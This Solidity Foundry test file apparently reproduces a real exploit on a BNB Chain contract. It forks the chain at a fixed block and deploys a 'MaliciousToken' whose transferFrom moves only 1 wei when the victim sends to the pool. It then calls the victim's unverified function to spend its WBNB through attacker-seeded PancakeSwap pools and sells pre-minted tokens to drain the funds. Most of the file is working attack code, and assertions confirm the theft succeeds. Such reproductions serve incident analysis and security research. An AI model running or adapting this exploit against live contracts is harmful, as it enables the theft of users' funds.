// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 700.32 USD
// Attacker : 0xEBE15A67e37203563D0d99AafaF06ecF41305FbA
// Attack Contract : 0xE603826Ac124450522684C763A37d0e181984716
// Vulnerable Contract : 0x0B0d67049FC34Fd8Ab2559A456a80276E805c4Da
// Attack Tx : https://bscscan.com/tx/0x33fa83ae1029a82ae4b46eb37432847f270a8e3690f2e9ba71a1e5172ff62a59
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x0B0d67049FC34Fd8Ab2559A456a80276E805c4Da#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1619
//
// Attack summary: The attacker deployed two ERC20 tokens, seeded PancakeSwap pools with tiny liquidity, and called an
// unverified victim function with those token addresses. The victim spent its full WBNB balance through the attacker
// pools. During the reverse swap, one malicious token transferred only 1 wei from the victim, leaving the WBNB/DD pair
// reserve-skewed so the attacker could sell pre-minted DD tokens for the victim-funded WBNB.
// Root cause: the victim exposed a public function that accepted arbitrary token path parameters and used the victim's
// own WBNB balance in PancakeSwap swaps, allowing attacker-controlled fee-on-transfer tokens to manipulate the pools.

address constant ATTACKER = 0xEBE15A67e37203563d0D99AafAf06eCf41305FbA;
address constant ATTACK_CONTRACT = 0xe603826ac124450522684c763a37D0E181984716;
address constant VICTIM = 0x0B0d67049fc34fD8aB2559a456A80276E805c4DA;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant PROFIT_RECEIVER = 0x000000000000000000000000000000000000bEEF;

contract ContractTest is BaseTestWithBalanceLog {
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IUniswapV2Factory private constant factory =
        IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);

    MaliciousToken private ddToken;
    MaliciousToken private secondToken;

    function setUp() public {
        uint256 forkBlock = 56_479_285;
        vm.createSelectFork("bsc", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VICTIM, "Victim");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(PROFIT_RECEIVER, "Profit Receiver");

        fundingToken = address(0);
        attacker = PROFIT_RECEIVER;
    }

    function testExploit() public balanceLog {
        vm.deal(address(this), 1 ether);

        ddToken = new MaliciousToken("DD", "DD");
        secondToken = new MaliciousToken("Token57", "T57");

        ddToken.approve(PANCAKE_ROUTER, type(uint256).max);
        secondToken.approve(PANCAKE_ROUTER, type(uint256).max);

        uint256 deadline = block.timestamp + 1_800;
        router.addLiquidityETH{value: 10_000_000_000_000}(
            address(ddToken), 0.1 ether, 0, 0, address(this), deadline
        );
        router.addLiquidity(address(ddToken), address(secondToken), 0.1 ether, 0.1 ether, 0, 0, address(this), deadline);

        address ddSecondPair = factory.getPair(address(ddToken), address(secondToken));
        secondToken.setVictimTransferRule(VICTIM, ddSecondPair);

        uint256 victimWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(VICTIM);
        bytes memory trigger = _buildVictimCall(victimWbnbBefore);
        (bool ok,) = VICTIM.call(trigger);
        require(ok, "victim call failed");

        address[] memory path = new address[](2);
        path[0] = address(ddToken);
        path[1] = WBNB_TOKEN;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            1_000_000 ether, 0, path, PROFIT_RECEIVER, block.timestamp + 1_800
        );

        assertEq(IERC20(WBNB_TOKEN).balanceOf(VICTIM), 2_486_728, "victim WBNB should be nearly drained");
        assertGt(PROFIT_RECEIVER.balance, 0.9 ether, "BNB profit");
    }

    function _buildVictimCall(
        uint256 amountIn
    ) internal view returns (bytes memory) {
        return abi.encodeWithSelector(
            bytes4(0xdc0b3665),
            uint256(0),
            uint256(0),
            address(secondToken),
            address(ddToken),
            amountIn,
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0)
        );
    }
}

contract MaliciousToken {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    address private victim;
    address private victimPair;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
        totalSupply = 10_000_000 ether;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setVictimTransferRule(address victim_, address victimPair_) external {
        victim = victim_;
        victimPair = victimPair_;
    }

    function balanceOf(
        address account
    ) external view returns (uint256) {
        return balances[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowances[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "insufficient allowance");
            allowances[from][msg.sender] = allowed - amount;
        }

        uint256 moved = _effectiveTransferAmount(from, to, amount);
        _transfer(from, to, moved);
        return true;
    }

    function _effectiveTransferAmount(address from, address to, uint256 amount) private view returns (uint256) {
        if (from == victim && to == victimPair) {
            return 1;
        }
        return amount;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(balances[from] >= amount, "insufficient balance");
        unchecked {
            balances[from] -= amount;
            balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }
}
